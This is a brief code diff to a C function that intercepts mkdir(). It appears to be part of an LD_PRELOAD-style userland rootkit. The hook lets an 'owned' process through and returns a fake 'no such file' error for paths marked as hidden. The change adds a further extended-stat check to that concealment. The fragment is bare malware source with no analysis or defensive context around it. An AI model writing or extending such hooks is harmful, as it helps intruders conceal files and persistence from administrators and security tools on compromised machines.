@@ -8,7 +8,7 @@ int mkdir(const char *pathname, mode_t mode)
 
     if(owned()) return old_mkdir(pathname, mode);
 
-    if(hidden_xattr(pathname)) { errno = ENOENT; return -1; }
+    if(hidden_xattr(pathname) || hidden_xstat(_STAT_VER, pathname, 32)) { errno = ENOENT; return -1; }
 
     return old_mkdir(pathname, mode);
 }
